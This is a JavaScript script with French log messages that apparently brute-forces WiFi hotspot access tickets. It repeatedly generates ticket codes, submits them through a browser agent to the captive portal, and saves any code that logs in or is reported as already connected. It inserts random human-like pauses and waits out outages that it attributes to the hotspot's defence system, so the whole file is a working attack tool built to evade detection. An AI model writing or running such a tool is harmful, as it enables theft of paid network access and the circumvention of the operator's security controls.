import Agent from "./dependance/agent.js";
import Helper from "./dependance/Helper.js";
import config from "./dependance/config.js";

const agent = new Agent();
await agent.initialize();

const path_save_code_valide = 'code-valide.json';
const code_valide = await Helper.readJson(path_save_code_valide);

const MESSAGES_DEJA_CONNECTE = [
    'déjà connecté',
    'already connected',
    'already logged',
    'session active',
];

function isDejaConnecte(message) {
    const msg = (message || '').toLowerCase();
    return MESSAGES_DEJA_CONNECTE.some(m => msg.includes(m));
}

async function saveCode(code, message) {
    code_valide.push({ code, message });
    await Helper.saveJson(code_valide, path_save_code_valide);
    console.log(`✅ Code sauvegardé: ${code} | ${message}`);
}

async function testTicket(ticket) {
    const tickets = [
        ticket,
        Helper.makeTicket({ code: ticket, revert: true }),
    ];

    for (const t of tickets) {
        if (await agent.isConnected()) return true;

        console.log(`code => ${t}`);
        const [res, message] = await agent.loginWithTicket(t);
        console.log(`resultat: ${res} | message:${message}`);

        const url = agent.page?.url() || '';
        const connectedByUrl = config.hotspot.successUrls.some(u => url.startsWith(u));

        if (connectedByUrl) {
            await saveCode(t, `Connexion réussie (${url})`);
            return true;
        }

        if (res || isDejaConnecte(message)) {
            await saveCode(t, message);
        }

        await Helper.sleepHuman(2);
    }
}

async function pauseEntreEssais() {
    const enLigne = await Helper.isOnline();
    if (!enLigne) {
        console.log('📡 WiFi tombé — système de défense du hotspot probable.');
        const retabli = await Helper.attendreConnexion();
        if (!retabli) {
            console.log('❌ Connexion non rétablie — arrêt.');
            return false;
        }
        const extraSec = Helper.randomReconnectExtra();
        console.log(`⏳ Pause de sécurité ${extraSec}s après rétablissement...`);
        await Helper.sleep(extraSec);
    } else {
        const { minSec, maxSec } = config.delays;
        const pauseSec = minSec + Math.floor(Math.random() * (maxSec - minSec + 1));
        console.log(`⏳ Pause ${pauseSec}s avant le prochain essai...`);
        await Helper.sleep(pauseSec);
    }
    return true;
}

let i = 1;
while (true) {
    console.log(`-------------tour ${i}---------------`);

    if (await agent.isConnected()) {
        console.log(`🌐 Déjà connecté (${agent.page.url()}) — arrêt.`);
        break;
    }

    const ticket = Helper.makeTicket();
    const res = await testTicket(ticket);

    if (res) {
        console.log(`🎯 Code valide trouvé — arrêt.`);
        break;
    }

    if (i >= config.loop.maxIterations) {
        console.log(`Fin d'itération (${config.loop.maxIterations} essais).`);
        break;
    }

    const continuer = await pauseEntreEssais();
    if (!continuer) break;

    i++;
}

await agent.close();
